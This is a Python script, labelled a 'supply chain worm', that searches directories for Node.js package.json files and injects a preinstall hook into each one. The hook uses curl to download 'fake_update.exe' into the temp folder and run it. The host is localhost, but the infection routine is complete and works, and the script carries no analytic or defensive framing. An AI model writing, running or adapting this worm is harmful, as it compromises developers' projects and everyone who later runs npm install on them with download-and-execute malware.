import os
import json

# CONFIGURATION
# In a real attack, this would scan the entire C:\Users\User\Source directory
TARGET_ROOT = os.getcwd() 
PAYLOAD_CMD = "curl -s http://127.0.0.1/fake_update.exe -o %TEMP%\\update.exe && %TEMP%\\update.exe"

def infect_package_json(filepath):
    print(f"[*] Analyzing: {filepath}")
    try:
        with open(filepath, 'r', encoding='utf-8') as f:
            data = json.load(f)
        
        # Check if already infected
        scripts = data.get("scripts", {})
        preinstall = scripts.get("preinstall", "")
        
        if "fake_update.exe" in preinstall:
            print("    [!] Already infected. Skipping.")
            return

        # Inject Payload
        print("    [+] Injecting 'preinstall' hook...")
        if preinstall:
            scripts["preinstall"] = f"{preinstall} & {PAYLOAD_CMD}"
        else:
            scripts["preinstall"] = PAYLOAD_CMD
            
        data["scripts"] = scripts
        
        # Write back
        with open(filepath, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=4)
        print("    [+] Infection Successful!")
        
    except Exception as e:
        print(f"    [!] Error: {e}")

def run_worm():
    print("--- [ dLNk Supply Chain Worm ] ---")
    print(f"[*] Scanning for Node.js projects in {TARGET_ROOT}...")
    
    count = 0
    for root, dirs, files in os.walk(TARGET_ROOT):
        if "node_modules" in root: continue # Skip dependencies
        
        if "package.json" in files:
            infect_package_json(os.path.join(root, "package.json"))
            count += 1
            
    print(f"[*] Scan Complete. Infected {count} targets.")

if __name__ == "__main__":
    run_worm()
